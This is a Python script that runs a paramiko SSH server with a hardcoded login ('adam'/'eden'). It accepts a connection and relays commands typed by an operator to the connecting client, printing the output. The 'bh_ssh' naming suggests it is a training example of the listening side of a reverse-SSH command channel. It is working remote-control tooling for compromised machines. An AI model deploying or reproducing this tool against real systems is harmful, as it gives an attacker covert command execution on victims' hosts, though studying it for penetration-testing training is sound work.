import socket
import paramiko
import threading
import sys

host_key = paramiko.RSAKey(filename='test_rsa.key')

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    
    def check_channel_request(self, kind: str, chanid: int) -> int:
        if (kind == 'session'):
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username: str, password: str) -> int:
        if (username == 'adam') and (password == 'eden'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

server = sys.argv[1]
ssh_port = int(sys.argv[2])

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server, ssh_port))
    sock.listen(100)
    print('[+] Listening for connections on %s:%d' % (server, ssh_port))
    client, addr = sock.accept()
except Exception as err:
    print('[-] Listening failed: ' + str(err))
print("[+] Connection received from %s:%d" % (addr))

try:
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(host_key)
    server = Server()
    try:
        bhSession.start_server(server=server)
    except paramiko.SSHException:
        print ('[-] SSH negotiation failed.')
    channel = bhSession.accept(20)
    print('[+] Authenticated!')
    print(channel.recv(1024))
    channel.send(b'Welcome to bh_ssh')
    while True:
        try:
            cmd = input("Enter command: ").rstrip()
            if cmd != 'exit':
                channel.send(cmd.encode())
                print(channel.recv(1024))
            else:
                channel.send(b'exit')
                print('Exiting')
                bhSession.close()
                break
        except KeyboardInterrupt:
            bhSession.close()
            break
except Exception as e:
    print("[-] Something wrong happend:", e)
    try:
        bhSession.close()
    except:
        pass
    sys.exit(1)

sys.exit(0)